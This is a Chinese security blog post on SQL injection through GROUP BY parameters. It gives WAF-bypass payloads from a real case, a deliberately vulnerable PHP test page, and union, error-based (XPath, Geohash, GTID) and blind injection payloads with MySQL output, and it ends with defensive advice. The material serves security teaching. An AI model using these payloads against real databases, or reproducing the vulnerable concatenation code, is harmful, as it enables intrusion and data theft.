# 018-SQL注入之GroupBy位置点注入


本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。

原文地址：https://bbs.ichunqiu.com/thread-63490-1-1.html

## Group by 简介

`GROUP BY` 语句将具有相同值的行分组为汇总行，例如&#34;查找每个地区的客户数量&#34;。

`GROUP BY` 语句通常与聚合函数（`COUNT()`、`MAX()`, `MIN()`, `SUM()`, `AVG()`) 按一列或多列对结果集进行分组。

### GROUP BY 语法

```sql
SELECT column_name, function(column_name)
FROM table_name
WHERE column_name operator value
GROUP BY column_name
HAVING condition
ORDER BY column_name
LIMIT num;
```

在`GROUP BY`子句中，列出了要用于分组的列名。查询结果将根据这些列的值进行分组，具有相同值的行将被归为一组。然后，对于每个组，可以使用聚合函数来计算汇总值。

### 使用场景

#### 1）查询每个顾客的订单总额

例如，假设有一个`Orders`表包含以下列：`OrderID`、`CustomerID`、`OrderDate`和`TotalAmount`。我们可以使用`GROUP BY`语句按`CustomerID`对订单进行分组，并计算每个客户的订单总金额：

```sql
SELECT CustomerID, SUM(TotalAmount) AS TotalSum
FROM Orders
GROUP BY CustomerID;
```

以上查询将返回每个客户的`CustomerID`和对应的订单总金额`TotalSum`。

需要注意的是，使用`GROUP BY`语句时，`SELECT`子句中的列必须是分组列或聚合函数的结果列。如果在`SELECT`子句中引用了其他列，则这些列必须在`GROUP BY`子句中列出。

`GROUP BY`语句可以用于多个列的组合分组，例如：

```sql
SELECT CustomerID, SUM(TotalAmount) AS TotalSum
FROM Orders
GROUP BY CustomerID;
```

以上查询将按`Country`和`City`两列进行分组，并计算每个组的记录数。

总之，`GROUP BY`语句在SQL中用于按照指定的列对结果进行分组，并进行聚合计算，以便更好地理解和分析数据。

#### 2）统计员工数量最多的5个部门

统计每个部门的员工数量，并按照员工数量降序排序，只返回前5个部门：

```sql
SELECT department, COUNT(*) as total_employees
FROM employees
GROUP BY department
ORDER BY total_employees DESC
LIMIT 5;
```

#### 3）统计不同部门的员工总数和平均薪资

查询不同部门的员工总数和平均工资，并将结果合并：

```sql
SELECT department, COUNT(*) as total_employees, AVG(salary) as avg_salary
FROM employees
GROUP BY department
UNION SELECT &#39;Overall&#39;, COUNT(*), AVG(salary)
FROM employees;
```

## GROUP BY 注入

上面给了几个group by的使用场景，`GROUP BY`子句后面的参数是用于指定列名或表达式，以对结果进行分组。这些参数通常是SQL查询的一部分，与order by 一样，无法直接预编译，因此也容易出现SQL注入。

只不过相比于order by位置点的注入，group by位置点更少见一些。

### 案例

最近帮朋友看了个注入点，是一个Groupby注入点

```
/api?pageSize=-1&amp;groupBy=id
```

在groupby参数的id加上单引号，引起报错，泄露SQL语句

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739474.png)

可以看到这里的group by 是存在拼接的，这个id是可控的，很明显是一个注入点。

把SQL语句简化以下就是：

```
select 1,2,3...,17 from table were table.a is null group by table.id
```

这其中的id是可控的，传进去就会与table.进行拼接，像这个group by位置的注入点，我很少有见到。

先说结果，注出来了，有waf，最后的几种payload:

```sql
# 转换成order by，利用rand()进行条件布尔注入：id order by rand(substr(version(),1,1)=&#39;8&#39;)，url编码绕过waf
id&#43;order&#43;by&#43;rand(%73%75%62%73%74%72%28%76%65%72%73%69%6f%6e%28%29,1,1)=&#39;8&#39;)
# 报错注入，id and extractvalue(0x5c,concat(1,(select version())))
id/**/and/**/extractvalue(0x5c,concat(&#39;~&#39;,/*!60000select*//**/version()))
# 报错注入，
id/**/and/**/updatexml(1,concat(0x7e,(/*!12345select*//**/version()),0x7e),1)
```

布尔注入的顺序会不同，得出版本：

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739431.png)

这里我字符加少了，只加了数字0-9，字母a-f，和符号.号，但版本的话大部分情况下数字0-9，加上符号点号.，够用了。如果是数据库名的话，想要全一点就是大小写字母&#43;数字&#43;短杠和下划线。

报错注入截图：

extractvalue语句：

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739491.png)

updatexml语句：

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739688.png)

### 本地环境

因为group by后面的注入点之前没怎么遇到过，这次就顺便研究下，在本地数据库mysql下进行测试。

改了下sqli-labs做案例，新建了一个less，代码如下：

```php
&lt;?php
include(&#34;../sql-connections/sql-connect.php&#34;);
error_reporting(0);
if(isset($_GET[&#39;groupby&#39;]))
{
	$groupby=$_GET[&#39;groupby&#39;];
	$sql=&#34;select * from users where username like &#39;admin%&#39; group by $groupby &#34;;
	#$sql=&#34;select * from users where username like &#39;admin%&#39; group by user.$groupby &#34;;
	$result=mysql_query($sql);
  echo $sql.&#39;&lt;br&gt;&#39;;
	if($result){
		$rows =  mysql_num_rows($result);
		echo &#39;查询结果共有&#39;.$rows.&#39;条记录&lt;br&gt;&#39;;
		echo &#34;&lt;table&gt;
                &lt;tr&gt;
                    &lt;th&gt;序号&lt;/th&gt;
                    &lt;th&gt;姓名&lt;/th&gt;
                    &lt;th&gt;密码&lt;/th&gt;
                &lt;tr&gt;&#34;;
		if($rows&gt;0){
			$count = 1;
        	while($row = mysql_fetch_assoc($result)){
            	echo &#34;&lt;tr&gt;
                	 &lt;td&gt;&#34;.$row[&#39;id&#39;].&#34;&lt;/td&gt;
                 	&lt;td&gt;&#34;.$row[&#39;username&#39;].&#34;&lt;/td&gt;
                 	&lt;td&gt;&#34;.$row[&#39;password&#39;].&#34;&lt;/td&gt;
             	&lt;/tr&gt;&#34;;
        	}
        	$count&#43;&#43;;
    	}
    	echo &#34;&lt;/table&gt;&#34;;
	}else {
		echo &#39;&lt;font color= &#34;#FFFF00&#34;&gt;&#39;;
		print_r(mysql_error());
		echo &#34;&lt;/font&gt;&#34;;  
	}
}
else { echo &#34;Please input the ID as parameter with numeric value&#34;;}
?&gt;
```

下面演示用到了两个数据表。

```sql
# sqli-labs 数据库，版本5.7.26
mysql&gt; select * from users;
&#43;----&#43;----------&#43;------------&#43;
| id | username | password   |
&#43;----&#43;----------&#43;------------&#43;
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
&#43;----&#43;----------&#43;------------&#43;
13 rows in set (0.02 sec)

# 自建数据库，版本8.0.31
mysql&gt; select * from users;
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
| id | name  | pass     | age  | area      |
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1 | 123456   |   18 | beijing   |
|  2 | test2 | 543210   |   20 | shanghai  |
|  3 | user1 | qwer1234 |   28 | guangzhou |
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
3 rows in set (0.01 sec)
```

### 获取字段数

group by 后面加数字就能进行字段数的枚举，当数字大于字段数时，就会产生如下报错：

```sql
# mysql 8.0.31
mysql&gt; select * from users where id=2 group by 5;
&#43;----&#43;-------&#43;--------&#43;------&#43;----------&#43;
| id | name  | pass   | age  | area     |
&#43;----&#43;-------&#43;--------&#43;------&#43;----------&#43;
|  2 | test2 | 543210 |   20 | shanghai |
&#43;----&#43;-------&#43;--------&#43;------&#43;----------&#43;
1 row in set (0.02 sec)

mysql&gt; select * from users where id=2 group by 6;
ERROR 1054 (42S22): Unknown column &#39;6&#39; in &#39;group statement&#39;
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739401.png)

还有一种报错情况，如下：

```sql
# mysql 5.7.26
mysql&gt; select * from users where username like &#39;admin%&#39; group by 1;
&#43;----&#43;----------&#43;----------&#43;
| id | username | password |
&#43;----&#43;----------&#43;----------&#43;
|  8 | admin    | admin    |
|  9 | admin1   | admin1   |
| 10 | admin2   | admin2   |
| 11 | admin3   | admin3   |
| 14 | admin4   | admin4   |
&#43;----&#43;----------&#43;----------&#43;
5 rows in set (0.00 sec)

mysql&gt; select * from users where username like &#39;admin%&#39; group by 2;
ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;security.users.id&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by

mysql&gt; select * from users where username like &#39;admin%&#39; group by 3;
ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;security.users.id&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by

mysql&gt; select * from users where username like &#39;admin%&#39; group by 4;
ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;group statement&#39;
mysql&gt;
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739798.png)

这个错误提示是由于MySQL的`sql_mode`配置中启用了`only_full_group_by`模式，它要求在使用`GROUP BY`子句时，SELECT列表中的非聚合列必须包含在GROUP BY子句中。

上述案例中id是非聚合列，所以必须要带上，如下：

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739667.png)

还有一种情况， group by后面的参数只能控制一部分，比如如下sql语句：

```php
$sql=&#34;select * from users where username like &#39;admin%&#39; group by user.$groupby &#34;;
$result=mysql_query($sql);
```

像案例中就是这种情况，这种情况下获取列名只能先闭合前面的列名，然后遍历第二位的数字，如下：

```sql
mysql&gt; select * from users where username like &#39;admin%&#39; group by users.id,3;
&#43;----&#43;----------&#43;----------&#43;
| id | username | password |
&#43;----&#43;----------&#43;----------&#43;
|  8 | admin    | admin    |
|  9 | admin1   | admin1   |
| 10 | admin2   | admin2   |
| 11 | admin3   | admin3   |
| 14 | admin4   | admin4   |
&#43;----&#43;----------&#43;----------&#43;
5 rows in set (0.00 sec)

mysql&gt; select * from users where username like &#39;admin%&#39; group by users.id,4;
ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;group statement&#39;
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739974.png)

### 联合查询

接下来看下联合查询的情况

众所周知，Where 后的注入点可以用 union select 联合查询，并且能控制回显位置。那么group by呢？

Group by 后面可以接union select，但无法控制回显位置。

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740028.png)

但但是，group by用于分类查询，limit语句只能放在后面位置，可以通过注释符注释掉它。

例如，我们需要查询前3个用户名为admin开头的

```sql
mysql&gt; select * from users where username like &#39;admin%&#39; group by id limit 3;
&#43;----&#43;----------&#43;----------&#43;
| id | username | password |
&#43;----&#43;----------&#43;----------&#43;
|  8 | admin    | admin    |
|  9 | admin1   | admin1   |
| 10 | admin2   | admin2   |
&#43;----&#43;----------&#43;----------&#43;
3 rows in set (0.01 sec)

mysql&gt; select * from users where username like &#39;admin%&#39; group by id union select 1,2,3; -- limit 3;
&#43;----&#43;----------&#43;----------&#43;
| id | username | password |
&#43;----&#43;----------&#43;----------&#43;
|  8 | admin    | admin    |
|  9 | admin1   | admin1   |
| 10 | admin2   | admin2   |
| 11 | admin3   | admin3   |
| 14 | admin4   | admin4   |
|  1 | 2        | 3        |
&#43;----&#43;----------&#43;----------&#43;
6 rows in set (0.01 sec)
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739913.png)

修改PHP SQL查询语句：

```php
$sql=&#34;select * from users where username like &#39;admin%&#39; group by $groupby limit 3&#34;;
$result=mysql_query($sql);
```

试着在group by后面拼接union select成功：

Payload:`groupby=id union select 1,user(),version()`

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740153.png)

### 报错注入

报错注入也简单，直接在group by后续位置插入报错语句即可：

#### XPath报错

```sql
mysql&gt; select * from users group by 1,(extractvalue(1,concat(&#39;~&#39;,(select version()))));
ERROR 1105 (HY000): XPATH syntax error: &#39;~8.0.31&#39;
mysql&gt; 
mysql&gt; select * from users group by 1, (updatexml(1,concat(0x7e,(select version()),0x7e),1));
ERROR 1105 (HY000): XPATH syntax error: &#39;~8.0.31~&#39;
mysql&gt; 
```



#### Geohash报错

Geohash报错在5.7.26上成功了，但是在8.0.31上失败了

```sql
# mysql 5.7.26
mysql&gt; select * from users where username like &#39;admin%&#39; group by users.id,1,(ST_LongFromGeoHash((select version())));
ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function ST_LONGFROMGEOHASH
mysql&gt; select * from users where username like &#39;admin%&#39; group by users.id,1,(ST_PointFromGeoHash((select version()),1));
ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function st_pointfromgeohash
mysql&gt; select * from users where username like &#39;admin%&#39; group by users.id,1,(ST_LatFromGeoHash((select version())));
ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function ST_LATFROMGEOHASH
mysql&gt;
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740311.png)

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740307.png)

```sql
# mysql 8.0.31 失败
mysql&gt; select * from users where id=2 group by 1,(ST_LongFromGeoHash((select version())));
&#43;----&#43;-------&#43;--------&#43;------&#43;----------&#43;
| id | name  | pass   | age  | area     |
&#43;----&#43;-------&#43;--------&#43;------&#43;----------&#43;
|  2 | test2 | 543210 |   20 | shanghai |
&#43;----&#43;-------&#43;--------&#43;------&#43;----------&#43;
1 row in set (0.01 sec)
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740592.png)

#### GTID报错

mysql 5.7.26上成功了

```sql
# mysql 5.7.26
mysql&gt; select * from users where username like &#39;admin%&#39; group by users.id,(gtid_subtract(version(),1));
ERROR 1772 (HY000): Malformed GTID set specification &#39;5.7.26&#39;.
mysql&gt; select * from users where username like &#39;admin%&#39; group by users.id,(gtid_subset(version(),1));
ERROR 1772 (HY000): Malformed GTID set specification &#39;5.7.26&#39;.
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740359.png)

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740297.png)

mysql 8.0.31失败

### 布尔盲注

布尔盲注这块，没想到其他办法，一种是利用union select

另一种是利用order by 的布尔盲注实现。

```sql
id order by rand(substr(version(),1,1)=&#39;8&#39;)
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740985.png)

因为group by后面可以接order by，所以适用于order by注入点的方法都可以用。

### 时间盲注

时间盲注想到的办法也是union select 和 order by，但是需要注意的是 order by会根据数据记录数把延时放大，比如sleep 1秒，有3条记录，则总共延时 3秒。

```sql
mysql&gt; select * from users group by 1 order by sleep(1);
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
| id | name  | pass     | age  | area      |
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1 | 123456   |   18 | beijing   |
|  2 | test2 | 543210   |   20 | shanghai  |
|  3 | user1 | qwer1234 |   28 | guangzhou |
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
3 rows in set (3.01 sec)
```

![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740643.png)

所以这种方法不推荐使用，尤其是查询大型数据库。

## 总结

要防止SQL注入攻击，建议采取以下措施：

1. 使用参数绑定或预编译语句：使用参数化查询或预编译语句，将用户提供的输入作为参数传递给SQL查询，而不是将其直接拼接到查询字符串中。这样可以防止恶意输入被解释为SQL代码。
2. 输入验证和过滤：对于动态生成的列名或表达式，确保对用户输入进行严格的验证和过滤，只允许合法的值和字符，避免将恶意输入传递给SQL查询。
3. 最小权限原则：在数据库的访问控制上，确保应用程序使用的数据库账户具有最小的权限，仅限于执行必要的操作，以减少潜在的攻击面。



对于无法直接进行预编译的内容，需要在代码层进行过滤和处理，比如可以通过映射的方式将前端接收的参数值匹配到后端相应的值，再传入SQL进行操作，从而避免将恶意输入传递给SQL查询。

 

以上就是本次分享全部内容，如有纰漏，欢迎各位大佬交流指正。





微信扫一扫，关注该公众号

![img](/resource/SQL注入之GroupBy位置点注入.assets/qrcode)



---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/  

